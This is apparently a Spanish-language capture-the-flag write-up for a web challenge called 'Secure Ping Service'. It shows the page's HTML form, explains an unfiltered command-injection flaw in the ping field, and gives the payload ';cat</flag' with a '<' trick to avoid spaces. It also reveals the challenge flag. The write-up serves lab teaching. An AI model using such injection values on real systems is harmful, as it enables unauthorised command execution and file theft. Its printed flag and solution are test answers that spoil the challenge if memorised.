Challenge: Secure Ping Service
Category: Web
Points: 20

Un administrador de sistemas ha desarrollado un programa para hacer ping de forma segura, pero nosotros, como hackers, tenemos nuestras dudas sobre su verdadera seguridad. Estamos analizando detenidamente el programa en busca de posibles vulnerabilidades que puedan ser explotadas.

Flag: `LetsCTF{N0t_s0_s3CuR3_M4te}`

Solución:

La página web consiste en un formulario que permite hacer ping a una dirección IP o un dominio. Al hacer ping a una dirección IP o dominio, el programa devuelve la salida del comando `ping` en la página web. Si marcamos el check de debug, el programa nos muestra también el comando que se ha ejecutado.

```html
<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web 50 @ Shellmates Infinite CTF 2k20</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
</head>

<body style="color: white;">
    <div class="splash">
        <h1 class="splash-head">Shellmates Secure Ping Service</span> ?</h1>
        <h2 style="background-color: red;">Try to read /flag file located in the / directory</h2>
        <p>Make sure you check the debug mode to get an idea of whats happening to your input</p>
        <form method="POST" class="pure-form">
            <input name="command" type="text" class="pure-input-1" placeholder="127.0.0.1" id="ip" />
            <br>
            Debug Mode <input type="checkbox" name="debug" class="pure-checkbox" style="display: inline;">
            <br>
            <button type="submit" name="ping" class="pure-button pure-button-primary button-large">Ping!</button>
        </form>
        <h3>Results</h3>
    </div>
</body>

</html>
```

Por ejemplo, si hacemos ping a 127.0.0.1, la salida obtenida es:

```sh
ping -c 1 127.0.0.1

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.019/0.019/0.019/0.000 ms
```

Nos damos cuenta de que el programa está ejecutando el comando `ping` sin filtrar la entrada del usuario. Por lo tanto, podemos inyectar comandos en el campo de entrada para ejecutar comandos arbitrarios en el servidor. Por la pista que nos da el programa, sabemos que el archivo flag se encuentra en el directorio raíz. Es decir, podemos leer el contenido del archivo flag inyectando el comando `cat /flag` en el campo de entrada.

Para obtener la flag, podemos inyectar el siguiente comando en el campo de entrada:

```sh
;cat</flag
```

El caracter `<` se utiliza para forzar un espacio en blanco en el comando `cat` para que el comando se ejecute correctamente. Al enviar el comando, obtenemos la siguiente salida:

```sh
ping -c 1 ;cat</flag

LetsCTF{N0t_s0_s3CuR3_M4te}
```
